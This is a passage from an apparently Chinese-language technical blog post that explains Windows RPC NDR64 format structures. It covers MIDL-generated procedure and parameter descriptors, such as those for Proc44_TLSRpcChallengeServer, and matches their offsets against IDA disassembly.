class="number">0x0</span>,<span class="comment">/* 0 */</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> Example1_FormatStringOffsetTable[] =</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">50</span>,</span><br><span class="line">    <span class="number">88</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p><code>Example1_FormatStringOffsetTable</code> 结构体里的值就是每一个rpc接口函数在<code>Example1__MIDL_ProcFormatString.Format</code>内存里的<strong>偏移</strong>, 因为我们声明了三个函数, 所以有三个值. 因为是从<code>Format</code>字段开始算的, 需要偏移2字节. </p><p>在ida中反汇编server, 在偏移<code>88+2 即 0x5a</code>位置, 就是<code>0, 0x48, ...</code></p><p><img src="/images/rpc_readme/1722224655345.png" alt="1722224655345"></p><blockquote><p>这里的<code>2 dup(0)</code>是指有两个重复的0. 偏移0x60+0x58 &#x3D; 0xb8, 0x140006cb8 位置的值为 <code>10h, 0, 0, 48h, 0, 0, 0, 0, 2....</code></p></blockquote><p><strong><code>Example1__MIDL_ProcFormatString</code> 结构体会具象化到 Example1_Ndr64ProcTable 里.</strong></p><p>让我们看一下<code>Example1_Ndr64ProcTable</code>结构体:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> FormatInfoRef Example1_Ndr64ProcTable[] = <span class="comment">// 这是一个描述符的数组.</span></span><br><span class="line">    &#123;</span><br><span class="line">    &amp;__midl_frag2,</span><br><span class="line">    &amp;__midl_frag7,</span><br><span class="line">    &amp;__midl_frag11</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">__midl_frag11_t</span> __midl_frag11 =</span><br><span class="line">&#123; </span><br><span class="line"><span class="comment">/* Proc44_TLSRpcChallengeServer */</span></span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* Proc44_TLSRpcChallengeServer */</span>      <span class="comment">/* procedure Proc44_TLSRpcChallengeServer */</span></span><br><span class="line">        (NDR64_UINT32) <span class="number">23986240</span> <span class="comment">/* 0x16e0040 */</span>,    <span class="comment">/* explicit handle */</span> <span class="comment">/* IsIntrepreted, ServerMustSize, ClientMustSize, HasReturn, ServerCorrelation, ClientCorrelation, HasExtensions */</span></span><br><span class="line">        (NDR64_UINT32) <span class="number">56</span> <span class="comment">/* 0x38 */</span> ,  <span class="comment">/* Stack size */</span></span><br><span class="line">        (NDR64_UINT32) <span class="number">76</span> <span class="comment">/* 0x4c */</span>,</span><br><span class="line">        (NDR64_UINT32) <span class="number">157</span> <span class="comment">/* 0x9d */</span>,</span><br><span class="line">        (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">        (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">        (NDR64_UINT16) <span class="number">7</span> <span class="comment">/* 0x7 */</span>,</span><br><span class="line">        (NDR64_UINT16) <span class="number">8</span> <span class="comment">/* 0x8 */</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* struct _NDR64_BIND_AND_NOTIFY_EXTENSION */</span></span><br><span class="line">        &#123; </span><br><span class="line">        <span class="comment">/* struct _NDR64_BIND_AND_NOTIFY_EXTENSION */</span></span><br><span class="line">            <span class="number">0x70</span>,    <span class="comment">/* FC64_BIND_CONTEXT */</span></span><br><span class="line">            (NDR64_UINT8) <span class="number">64</span> <span class="comment">/* 0x40 */</span>,</span><br><span class="line">            <span class="number">0</span> <span class="comment">/* 0x0 */</span>,   <span class="comment">/* Stack offset */</span></span><br><span class="line">            (NDR64_UINT8) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">            (NDR64_UINT8) <span class="number">0</span> <span class="comment">/* 0x0 */</span></span><br><span class="line">        &#125;,</span><br><span class="line">        (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>      <span class="comment">/* Notify index */</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* arg_0 */</span>      <span class="comment">/* parameter arg_0 */</span></span><br><span class="line">        &amp;__midl_frag12, <span class="comment">// _NDR64_PARAM_FORMAT.Type</span></span><br><span class="line">        &#123;               <span class="comment">// _NDR64_PARAM_FORMAT.Attribute</span></span><br><span class="line">        <span class="comment">/* arg_0 */</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        &#125;,    <span class="comment">/* [in] */</span></span><br><span class="line">        (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">        <span class="number">0</span> <span class="comment">/* 0x0 */</span>,   <span class="comment">// _NDR64_PARAM_FORMAT.StackOffset</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* arg_1 */</span>      <span class="comment">/* parameter arg_1 */</span></span><br><span class="line">        &amp;__midl_frag13,</span><br><span class="line">        &#123; </span><br><span class="line">        <span class="comment">/* arg_1 */</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        &#125;,    <span class="comment">/* [in], Basetype, ByValue */</span></span><br><span class="line">        (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">        <span class="number">8</span> <span class="comment">/* 0x8 */</span>,   <span class="comment">/* Stack offset */</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* arg_2 */</span>      <span class="comment">/* parameter arg_2 */</span></span><br><span class="line">        &amp;__midl_frag15,</span><br><span class="line">        &#123; </span><br><span class="line">        <span class="comment">/* arg_2 */</span></span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        &#125;,    <span class="comment">/* MustSize, MustFree, [in], SimpleRef */</span></span><br><span class="line">        (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">        <span class="number">16</span> <span class="comment">/* 0x10 */</span>,   <span class="comment">/* Stack offset */</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* arg_3 */</span>      <span class="comment">/* parameter arg_3 */</span></span><br><span class="line">        &amp;__midl_frag22,</span><br><span class="line">        &#123; </span><br><span class="line">        <span class="comment">/* arg_3 */</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">            <span class="number">1</span></span><br><span class="line">        &#125;,    <span class="comment">/* MustFree, [out], UseCache */</span></span><br><span class="line">        (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">        <span class="number">24</span> <span class="comment">/* 0x18 */</span>,   <span class="comment">/* Stack offset */</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* arg_4 */</span>      <span class="comment">/* parameter arg_4 */</span></span><br><span class="line">        &amp;__midl_frag26,</span><br><span class="line">        &#123; </span><br><span class="line">        <span class="comment">/* arg_4 */</span></span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">            <span class="number">1</span></span><br><span class="line">        &#125;,    <span class="comment">/* MustSize, MustFree, [out], UseCache */</span></span><br><span class="line">        (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">        <span class="number">32</span> <span class="comment">/* 0x20 */</span>,   <span class="comment">/* Stack offset */</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* arg_5 */</span>      <span class="comment">/* parameter arg_5 */</span></span><br><span class="line">        &amp;__midl_frag29,</span><br><span class="line">        &#123; </span><br><span class="line">        <span class="comment">/* arg_5 */</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        &#125;,    <span class="comment">/* [in], [out], Basetype, SimpleRef */</span></span><br><span class="line">        (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">        <span class="number">40</span> <span class="comment">/* 0x28 */</span>,   <span class="comment">/* Stack offset */</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* error_status_t */</span>      <span class="comment">/* parameter error_status_t */</span></span><br><span class="line">        &amp;__midl_frag30,</span><br><span class="line">        &#123; </span><br><span class="line">        <span class="comment">/* error_status_t */</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        &#125;,    <span class="comment">/* [out], IsReturn, Basetype, ByValue */</span></span><br><span class="line">        (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">        <span class="number">48</span> <span class="comment">/* 0x30 */</span>,   <span class="comment">/* Stack offset */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里可以看到, 每一个参数都有描述符.</p><p>在IDA中如下:</p><p><img src="/images/rpc_readme/1722225347730.png" alt="1722225347730"></p><p>我们查看一下<code>__midl_frag11_t</code>结构体的定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_PROC_FORMAT</span> <span class="title">frag1</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_BIND_AND_NOTIFY_EXTENSION</span> <span class="title">frag2</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_PARAM_FORMAT</span> <span class="title">frag3</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_PARAM_FORMAT</span> <span class="title">frag4</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_PARAM_FORMAT</span> <span class="title">frag5</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_PARAM_FORMAT</span> <span class="title">frag6</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_PARAM_FORMAT</span> <span class="title">frag7</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_PARAM_FORMAT</span> <span class="title">frag8</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_PARAM_FORMAT</span> <span class="title">frag9</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">__midl_frag11_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_PARAM_FORMAT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PNDR64_FORMAT       Type;</span><br><span class="line">    NDR64_PARAM_FLAGS   Attributes;</span><br><span class="line">    NDR64_UINT16        Reserved;</span><br><span class="line">    NDR64_UINT32        StackOffset;</span><br><span class="line">&#125; NDR64_PARAM_FORMAT, *PNDR64_PARAM_FORMAT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_PARAM_FLAGS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    NDR64_UINT16    MustSize            : <span class="number">1</span>;</span><br><span class="line">    NDR64_UINT16    MustFree            : <span class="number">1</span>;</span><br><span class="line">    NDR64_UINT16    IsPipe              : <span class="number">1</span>;</span><br><span class="line">    NDR64_UINT16    IsIn                : <span class="number">1</span>;</span><br><span class="line">    NDR64_UINT16    IsOut               : <span class="number">1</span>;<span class="comment">// 4</span></span><br><span class="line">    NDR64_UINT16    IsReturn            : <span class="number">1</span>;</span><br><span class="line">    NDR64_UINT16    IsBasetype          : <span class="number">1</span>;</span><br><span class="line">    NDR64_UINT16    IsByValue           : <span class="number">1</span>;</span><br><span class="line">    NDR64_UINT16    IsSimpleRef         : <span class="number">1</span>;<span class="comment">// 8</span></span><br><span class="line">    NDR64_UINT16    IsDontCallFreeInst  : <span class="number">1</span>;</span><br><span class="line">    NDR64_UINT16    SaveForAsyncFinish  : <span class="number">1</span>;</span><br><span class="line">    NDR64_UINT16    IsPartialIgnore     : <span class="number">1</span>;</span><br><span class="line">    NDR64_UINT16    IsForceAllocate     : <span class="number">1</span>;<span class="comment">// 12</span></span><br><span class="line">    NDR64_UINT16    Reserved            : <span class="number">2</span>;</span><br><span class="line">    NDR64_UINT16    UseCache            : <span class="number">1</span>;</span><br><span class="line">&#125; NDR64_PARAM_FLAGS;</span><br></pre></td></tr></table></figure><p>以第二个参数的描述符举例:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line"><span class="comment">/* arg_2 */</span>      <span class="comment">/* parameter arg_2 */</span></span><br><span class="line">    &amp;__midl_frag15,</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* arg_2 */</span></span><br><span class="line">        <span class="number">1</span>,<span class="comment">//MustSize</span></span><br><span class="line">        <span class="number">1</span>,<span class="comment">//MustFree</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,<span class="comment">//IsIn</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,<span class="comment">//IsSimpleRef</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">    &#125;,    <span class="comment">/* MustSize, MustFree, [in], SimpleRef */</span></span><br><span class="line">    (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">    <span class="number">16</span> <span class="comment">/* 0x10 */</span>,   <span class="comment">/* Stack offset */</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>它的 Attribute为 <code>10Bh</code>, 即<code>IsSimpleRef</code>, <code>IsIn</code>, <code>MustFree</code>, <code>MustSize</code>. </p><p>查看<code>__midl_frag15</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_STRUCTURE_HEADER_FORMAT</span>&#123;</span></span><br><span class="line">        NDR64_FORMAT_CHAR       FormatCode;</span><br><span class="line">        NDR64_ALIGNMENT         Alignment;</span><br><span class="line">        NDR64_STRUCTURE_FLAGS   Flags;</span><br><span class="line">        NDR64_UINT8             Reserve;</span><br><span class="line">        NDR64_UINT32            MemorySize;</span><br><span class="line">    &#125;</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* uknow1 */</span></span><br><span class="line">        <span class="number">0x31</span>,    <span class="comment">/* FC64_PSTRUCT */</span> <span class="comment">// 说明是个自定义结构体. 格式-值 对应表见 NDR64_FORMAT_CHARATER 章节</span></span><br><span class="line">        (NDR64_UINT8) <span class="number">7</span> <span class="comment">/* 0x7 */</span>, <span class="comment">// 8字节对齐</span></span><br><span class="line">        &#123; </span><br><span class="line">        <span class="comment">/* uknow1 */</span></span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        (NDR64_UINT8) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">        (NDR64_UINT32) <span class="number">40</span> <span class="comment">/* 0x28 */</span> <span class="comment">// 说明结构体需要的字节为0x28. </span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_NO_REPEAT_FORMAT</span> &#123;</span></span><br><span class="line">           NDR64_FORMAT_CHAR    FormatCode;</span><br><span class="line">           NDR64_UINT8          Flags;</span><br><span class="line">           NDR64_UINT16         Reserved1;</span><br><span class="line">           NDR64_UINT32         Reserved2;</span><br><span class="line">        &#125;</span><br><span class="line">         &#123; </span><br><span class="line">         <span class="comment">/* struct _NDR64_NO_REPEAT_FORMAT */</span></span><br><span class="line">             <span class="number">0x80</span>,    <span class="comment">/* FC64_NO_REPEAT */</span></span><br><span class="line">             (NDR64_UINT8) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">             (NDR64_UINT16) <span class="number">0</span> <span 